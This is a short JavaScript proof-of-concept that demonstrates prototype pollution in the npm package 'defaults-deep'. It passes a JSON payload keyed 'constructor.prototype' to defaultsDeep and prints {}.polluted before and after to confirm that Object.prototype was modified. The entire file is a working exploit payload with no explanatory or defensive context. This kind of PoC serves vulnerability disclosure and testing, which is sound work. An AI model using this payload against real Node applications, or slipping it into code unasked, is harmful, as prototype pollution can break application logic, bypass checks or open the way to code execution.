var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const defaultsDeep = require('defaults-deep');
console.log({}.polluted);
let malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
defaultsDeep(obj, JSON.parse(malicious_payload));
console.log({}.polluted);